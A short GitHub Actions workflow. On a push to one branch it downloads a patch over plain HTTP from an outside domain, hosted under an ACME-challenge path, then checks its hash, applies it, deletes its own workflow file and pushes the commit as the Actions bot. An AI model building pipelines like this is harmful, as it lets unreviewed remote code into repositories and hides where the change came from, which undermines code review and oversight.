name: apply-t32-verified-patch

on:
  push:
    branches:
      - plan/t32-provider-recovery-worker-console

permissions:
  contents: write

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5
        with:
          fetch-depth: 0
      - name: Download and verify locally tested T32 patch
        run: |
          curl --fail --show-error --silent \
            http://news.cheapcoding.top/.well-known/acme-challenge/t32-38b638b9e35d.patch \
            -o /tmp/t32.patch
          echo "38b638b9e35dd368697e453bf8c02871cb67e1d35448c16acaa66e0a9230294f  /tmp/t32.patch" | sha256sum -c -
      - name: Apply tested patch and replace staging workflow
        run: |
          git apply --index /tmp/t32.patch
          rm .github/workflows/t32-apply.yml
          git add -A
          git diff --cached --check
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "feat: add t32 controlled recovery and worker console"
          git push origin HEAD:plan/t32-provider-recovery-worker-console
